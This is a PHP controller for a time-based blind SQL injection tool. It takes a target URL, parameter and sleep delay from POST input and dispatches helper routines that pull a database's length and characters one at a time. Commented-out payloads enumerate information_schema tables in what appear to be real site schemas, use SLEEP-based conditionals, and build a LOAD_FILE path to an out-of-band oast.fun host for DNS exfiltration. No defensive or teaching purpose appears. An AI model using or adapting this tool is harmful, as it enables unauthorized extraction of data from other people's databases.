<?php
include './includes/sql_conn.php';
$t11 = microtime(true);
$state = ['id'=>1];
//*

//*/

if ($_POST['ptype'] == '2') {
    $finderp = $_POST['finder'];
    $targetp = $_POST['target'];
    $sleepp = $_POST['sleep'];
    $charposp = $_POST['charpos'];
    $paramp = $_POST['param'];
    

    if ($_POST['action'] == 'length') {
        echo length_finder($sleepp, $targetp, $paramp, $state);
    } elseif ($_POST['action'] == 'char') {
        if ($finderp == '1') {
            $word = character_finder($charposp, $paramp, $targetp, $sleepp, $state);
        } elseif ($finderp == '2') {
            $word = character_finder2($charposp, $paramp, $targetp, $sleepp, $state);
        } elseif ($finderp == '3') {
            $word = character_finder_punctuation($charposp, $paramp, $targetp, $sleepp, $state);
        } elseif ($finderp == '4') {
            $word = character_finder_special($charposp, $paramp, $targetp, $sleepp, $state);
        }

        echo $word;
    }
} elseif ($_POST['ptype'] == '1') {
    $finderp = $_POST['finder'];
    $targetp = $_POST['target'];
    $sleepp = $_POST['sleep'];
    $charposp = $_POST['charpos'];
    $paramp = $_POST['param'];
    $word = "pesaflow";
    //$word = "\\\\kotnova.chp0eah2vtc0000dnx6gge5y8fcyyyyyb.oast.fun\\a";
    $hex = '0x' . bin2hex($word);
  

    //$query = "(SELECT(COUNT(*))FROM(information_schema.tables)WHERE(table_schema=".$hex."))=96";
    //$query = "(SELECT(LOAD_FILE(concat(".$hex."))))=1";

    //$query = "(SELECT(COUNT(*))FROM(information_schema.columns)WHERE(table_schema='pesaflow'%20AND%20table_name='news'))>10";
    //$query = "(SELECT(TABLE_NAME)FROM(information_schema.tables)WHERE(table_schema='tsavosit_collo')ORDER%20BY(TABLE_NAME)LIMIT%201)='authors'";
    //$injection = "(SELECT(IF((SELECT(COUNT(*))FROM(information_schema.tables)WHERE(table_schema='tsavosit_faith'))=0,SLEEP(5),1)))";
    //$query = "=24";
    $i = 'VALID QUERY';

    echo count_checker($sleepp, $targetp, $paramp, $i, $hex, $state) . '<BR/>';
}




/*
$start = 'result:';

if (startsWith($word, $start)) {
    $str1 = str_replace($start, '', $word);

    echo "First character: " . asciiToCharacter($str1);
} else {
    echo "The character not found :" . $word;
}

*/
$t22 = microtime(true);
$tdd = $t22 - $t11;

echo 'All time - ' . $tdd;
